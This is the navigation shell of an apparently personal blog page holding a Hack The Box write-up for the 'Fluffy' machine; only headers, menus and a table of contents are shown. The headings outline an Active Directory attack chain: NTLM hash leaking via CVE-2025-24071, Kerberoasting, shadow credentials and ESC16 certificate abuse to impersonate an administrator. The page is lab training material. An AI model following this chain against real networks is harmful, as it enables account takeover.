
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="ch3ckm8">
      
      
        <link rel="canonical" href="https://ch3ckm8.github.io/personal_blog4/ch3ckm8_HTB_fluffy/">
      
      
        <link rel="prev" href="../ch3ckm8_HTB_Flight/">
      
      
        <link rel="next" href="../ch3ckm8_HTB_puppy/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Fluffy - Ch3ckm8 Vault</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/interactive_graph.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/obsidian_tags.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/custom.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#intro" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Ch3ckm8 Vault" class="md-header__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Ch3ckm8 Vault
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Fluffy
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
  
    
  
  Welcome

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../ch3ckm8_HTB_Active/" class="md-tabs__link">
          
  
  
  HTB Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-tabs__link">
          
  
  
  Other CTF Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../windows/" class="md-tabs__link">
          
  
  
  Tags

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Ch3ckm8 Vault" class="md-nav__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    Ch3ckm8 Vault
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    HTB Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Active/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Administrator/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Administrator
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Blackfield/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blackfield
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Cascade/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cascade
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_EscapeTwo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    EscapeTwo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Nocturnal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Nocturnal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Return/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Return
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_TheFrizz/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TheFrizz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_forest/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_monteverde/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Monteverde
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_sauna/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sauna
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Timelapse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Timelapse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_cicada/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cicada
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Escape/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Escape
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Flight/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Flight
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Fluffy
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Fluffy
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#correlating-creds-with-services" class="md-nav__link">
    <span class="md-ellipsis">
      Correlating creds with services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-jfleischman" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as j.fleischman
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration as j.fleischman">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#inspecting-shares-contents" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting share's contents
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inspecting share&#39;s contents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#inspecting-the-pdf-file" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting the PDF file
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inspecting the PDF file">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#analyzing-the-cves-mentioned-inside-the-pdf" class="md-nav__link">
    <span class="md-ellipsis">
      Analyzing the CVEs mentioned inside the PDF
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inspecting-the-rest-of-the-files" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting the rest of the files
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploiting-cve-2025-24071-leaking-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting CVE-2025-24071 (Leaking NTLM hash)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting CVE-2025-24071 (Leaking NTLM hash)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#uploading-the-script-via-smbclient" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading the script via smbclient
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listen-for-incoming-connections" class="md-nav__link">
    <span class="md-ellipsis">
      Listen for incoming connections
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking NTLM hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#correlating-creds-with-services_1" class="md-nav__link">
    <span class="md-ellipsis">
      Correlating creds with services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration-as-pagila" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration as p.agila
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-pagila" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as p.agila
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration as p.agila">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-users" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerating Users
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-groups" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerating Groups
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-hashes-of-kerberoastable-accounts" class="md-nav__link">
    <span class="md-ellipsis">
      Finding hashes of kerberoastable accounts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attempting-to-crack-hashes" class="md-nav__link">
    <span class="md-ellipsis">
      Attempting to crack hashes
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-pagila" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as p.agila
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#add-user-to-group" class="md-nav__link">
    <span class="md-ellipsis">
      Add user to group
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Add user to group">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#how-to-take-advantage-of-genericwrite" class="md-nav__link">
    <span class="md-ellipsis">
      How to take advantage of GenericWrite ?
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#what-are-shadow-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      What are shadow credentials ?
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#adding-shadow-credential" class="md-nav__link">
    <span class="md-ellipsis">
      Adding Shadow Credential
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Adding Shadow Credential">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#towards-winrm_svc" class="md-nav__link">
    <span class="md-ellipsis">
      Towards WINRM_SVC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#towards-ca_svc" class="md-nav__link">
    <span class="md-ellipsis">
      Towards CA_SVC
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#searching-for-vulnerable-certificates" class="md-nav__link">
    <span class="md-ellipsis">
      Searching for vulnerable certificates
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-esc16" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting ESC16
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting ESC16">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-read-the-original-upn-of-the-victim-account-optional-for-recovery" class="md-nav__link">
    <span class="md-ellipsis">
      1 : Read the original UPN of the victim account (optional - for recovery).
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-update-the-victim-accounts-upn-to-that-of-the-target-administrator-samaccountname" class="md-nav__link">
    <span class="md-ellipsis">
      2: Update the victim account’s UPN to that of the target administrator sAMAccountName.
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-request-a-certificate-issued-as-the-victim-user-from-any-appropriate-client-authentication-template-eg-user-on-the-ca-vulnerable-to-esc16" class="md-nav__link">
    <span class="md-ellipsis">
      3: Request a certificate issued as the "victim" user from any appropriate client authentication template* (e.g., "user") on the CA vulnerable to ESC16
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-request-a-certificate" class="md-nav__link">
    <span class="md-ellipsis">
      **4. Request a certificate
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-restore-the-upn-of-the-victim-account" class="md-nav__link">
    <span class="md-ellipsis">
      5 : Restore the UPN of the "victim" account.
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#6-authenticate-as-the-target-administrator" class="md-nav__link">
    <span class="md-ellipsis">
      6 : Authenticate as the target administrator.
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_puppy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Puppy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_tombwatcher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tombwatcher
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Other CTF Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Other CTF Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RoboGRoot's-Portfolio
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Tags
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    windows
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AD/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AD
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADconnectAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADconnectAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AS-REP-roasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AS-REP-roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../DCSync/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCSync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../GSSAPIauthentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GSSAPIauthentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../NotAssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NotAssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OSCPpath/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OSCPpath
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PortForwarding/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PortForwarding
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PrivGroupAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivGroupAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RCE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RCE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RecycleBin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RecycleBin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WebApp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WebApp
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WinPEAS/" class="md-nav__link">
        
  
  
